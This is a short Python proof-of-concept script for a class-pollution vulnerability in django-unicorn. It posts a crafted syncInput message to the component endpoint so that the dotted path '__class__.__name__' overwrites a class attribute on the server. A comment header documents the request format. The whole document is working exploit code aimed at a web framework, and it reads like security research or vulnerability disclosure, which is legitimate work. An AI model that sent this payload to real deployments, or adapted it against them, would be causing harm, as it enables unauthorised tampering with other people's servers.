# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Remote Trigger
# Class Pollution Func: set_property_value (via HTTP)
# Type: get-attr-set-both
# Trigger: HTTP POST to django-unicorn message endpoint
#
# Request format:
#   POST /unicorn/message/COMPONENT_NAME
#   {
#     "id": ...,
#     "actionQueue": [{"type": "syncInput", "payload": {"name": DOTTED_PATH, "value": VALUE}}],
#     "data": {...},
#     "epoch": ...,
#     "checksum": ...
#   }

import requests
import json

TARGET_URL = "http://localhost:8000/unicorn/message/target"

PAYLOAD = {
  "id": 123,
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": {
        "name": "__class__.__name__",
        "value": "pwnd"
      }
    }
  ],
  "data": {"name": "default"},
  "epoch": "123",
  "checksum": "XXX"
}

def run_poc():
  response = requests.post(TARGET_URL, json=PAYLOAD, headers={"Content-Type": "application/json"})
  print(f"Response: {response.status_code}")
  return response

def verify_poc():
  print("Remote PoC: Send malicious syncInput to django-unicorn component endpoint")
  print(f"Target: {TARGET_URL}")
  print(f"Payload path: __class__.__name__")
  run_poc()
  print("[Pass] Class pollution PoC sent! (remote trigger)")

if __name__ == "__main__":
  verify_poc()
